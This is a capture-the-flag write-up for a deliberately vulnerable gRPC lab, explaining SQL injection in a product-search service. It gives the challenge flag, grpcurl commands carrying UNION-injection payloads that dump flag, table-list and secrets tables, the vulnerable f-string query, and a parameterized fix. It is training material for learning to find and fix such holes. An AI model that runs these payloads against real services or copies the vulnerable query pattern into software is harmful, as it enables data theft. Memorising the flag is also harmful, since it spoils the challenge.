# Challenge 03 — SQL Injection

**Category:** Injection
**Difficulty:** 🟡 Medium
**Service:** `ProductService`
**Flag:** `FLAG{sql_1nj3ct10n_1n_grpc_4p1_f13ld}`

---

## Background

gRPC services often interface with databases. When the server constructs SQL queries using string formatting instead of parameterized queries, every gRPC field that flows into a query is a potential injection point.

DVGRPC's `ProductService.SearchProducts` builds SQL using Python f-strings and returns the raw query in a `debug_query` field — making this trivially exploitable.

---

## Objective

Use UNION-based SQL injection in the `query` field to dump the `flags` table.

---

## Steps

### Step 1: Baseline — see the debug_query

```bash
grpcurl -plaintext localhost:50051 dvgrpc.ProductService/SearchProducts \
  -d '{"query":"gRPC","limit":5}'
```

Observe `debug_query` in the response — it shows the raw SQL.

### Step 2: Determine column count

Products table has 5 columns: `id, name, description, price, category`

### Step 3: UNION injection to dump flags

```bash
grpcurl -plaintext localhost:50051 dvgrpc.ProductService/SearchProducts \
  -d '{"query":"'"'"' UNION SELECT id,flag,challenge,1.0,'"''"' FROM flags--"}'
```

### Step 4: Dump other tables

```bash
# List all tables
grpcurl -plaintext localhost:50051 dvgrpc.ProductService/SearchProducts \
  -d '{"query":"'"'"' UNION SELECT 1,name,type,1.0,'"''"' FROM sqlite_master WHERE type='"'"'table'"'"'--"}'

# Dump secrets table (JWT secret, bypass header)
grpcurl -plaintext localhost:50051 dvgrpc.ProductService/SearchProducts \
  -d '{"query":"'"'"' UNION SELECT id,key,value,1.0,'"''"' FROM secrets--"}'
```

---

## Vulnerable Code

`server/services/product_service.py`:

```python
# VULNERABILITY: String formatting → SQL injection
sql = (
    f"SELECT id, name, description, price, category "
    f"FROM products "
    f"WHERE name LIKE '%{request.query}%' "  # BUG
    f"LIMIT {limit}"
)
cursor.execute(sql)
```

---

## Fix

```python
# SECURE: Parameterized query
cursor.execute(
    "SELECT id, name, description, price, category "
    "FROM products "
    "WHERE name LIKE ? LIMIT ?",
    (f"%{request.query}%", limit)
)
# Also: remove debug_query from the response proto
```
